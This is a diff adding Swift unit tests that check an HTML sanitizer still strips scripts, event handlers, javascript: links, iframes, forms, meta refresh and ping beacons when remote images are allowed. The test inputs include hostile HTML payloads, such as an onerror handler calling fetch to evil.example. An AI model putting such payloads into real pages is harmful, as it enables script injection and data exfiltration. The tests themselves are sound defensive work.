@@ -13,6 +13,10 @@ final class HTMLSanitizerTests: XCTestCase {
         HTMLSanitizer.sanitize(html)
     }
 
+    private func sanitizeAllowingRemote(_ html: String) -> String {
+        HTMLSanitizer.sanitize(html, allowRemoteResources: true)
+    }
+
     func testScriptBlockIsRemoved() {
         let out = sanitize("<p>Hallo</p><script>alert('x')</script><p>Welt</p>")
         XCTAssertFalse(out.lowercased().contains("<script"))
@@ -110,5 +114,75 @@ final class HTMLSanitizerTests: XCTestCase {
         }
         // Der sichtbare Link bleibt erhalten (Ziel wird erst beim Klick bestätigt).
         XCTAssertTrue(out.contains("shop.example"))
+    }
+
+    // MARK: – Stufe 3: externe Inhalte freigegeben
+
+    func testRemoteImageSurvivesWhenAllowed() {
+        let out = sanitizeAllowingRemote(#"<img src="https://cdn.example/logo.png" width="40">"#)
+        XCTAssertTrue(out.contains("https://cdn.example/logo.png"))
+    }
+
+    func testRemoteCssSurvivesWhenAllowed() {
+        let out = sanitizeAllowingRemote(
+            #"<style>body { background: url(https://cdn.example/bg.png); }</style>"#)
+        XCTAssertTrue(out.contains("https://cdn.example/bg.png"))
+    }
+
+    /// Auch mit Freigabe bleibt alles entfernt, was ohne Netzwerk Schaden
+    /// anrichten kann.
+    func testScriptAndEventHandlersStayRemovedWhenRemoteAllowed() {
+        let out = sanitizeAllowingRemote(
+            #"<script>alert('x')</script><img src="https://cdn.example/a.png" onerror="fetch('https://evil.example')">"#)
+        XCTAssertFalse(out.lowercased().contains("<script"))
+        XCTAssertFalse(out.contains("alert"))
+        XCTAssertFalse(out.lowercased().contains("onerror"))
+        XCTAssertFalse(out.contains("evil.example"))
+        XCTAssertTrue(out.contains("https://cdn.example/a.png"))
+    }
+
+    func testJavaScriptHrefStaysNeutralisedWhenRemoteAllowed() {
+        let out = sanitizeAllowingRemote(#"<a href="javascript:alert(1)">klick</a>"#)
+        XCTAssertFalse(out.lowercased().contains("javascript:"))
+    }
+
+    func testIframeAndFormStayRemovedWhenRemoteAllowed() {
+        let out = sanitizeAllowingRemote(
+            #"<iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name="x"></form>"#)
+        XCTAssertFalse(out.lowercased().contains("<iframe"))
+        XCTAssertFalse(out.lowercased().contains("<form"))
+        XCTAssertFalse(out.contains("evil.example"))
+    }
+
+    func testMetaRefreshStaysRemovedWhenRemoteAllowed() {
+        let out = sanitizeAllowingRemote(
+            #"<meta http-equiv="refresh" content="0;url=https://evil.example">"#)
+        XCTAssertFalse(out.lowercased().contains("http-equiv"))
+        XCTAssertFalse(out.contains("evil.example"))
+    }
+
+    /// `ping` ist ein reiner Tracking-Beacon beim Klick und wird auch in
+    /// Stufe 3 entfernt.
+    func testPingAttributeStaysRemovedWhenRemoteAllowed() {
+        let out = sanitizeAllowingRemote(
+            #"<a href="https://shop.example/item" ping="https://tracker.example/p">Angebot</a>"#)
+        XCTAssertFalse(out.contains("ping="))
+        XCTAssertFalse(out.contains("tracker.example"))
+        XCTAssertTrue(out.contains("shop.example"))
+    }
+
+    func testLocalResourcesSurviveWhenRemoteAllowed() {
+        let out = sanitizeAllowingRemote(
+            #"<img src="cid:logo@example"><img src="data:image/png;base64,iVBORw0KGgo=">"#)
+        XCTAssertTrue(out.contains("cid:logo@example"))
+        XCTAssertTrue(out.contains("data:image/png"))
+    }
+
+    /// Ohne Freigabe darf auch nach dem Umbau nichts von außen nachgeladen
+    /// werden — der Standard bleibt geschlossen.
+    func testDefaultStaysClosedAfterStageThree() {
+        let html = #"<img src="https://cdn.example/a.png"><style>a{background:url(https://cdn.example/b.png)}</style>"#
+        let out = sanitize(html)
+        XCTAssertFalse(out.contains("cdn.example"))
     }
 }
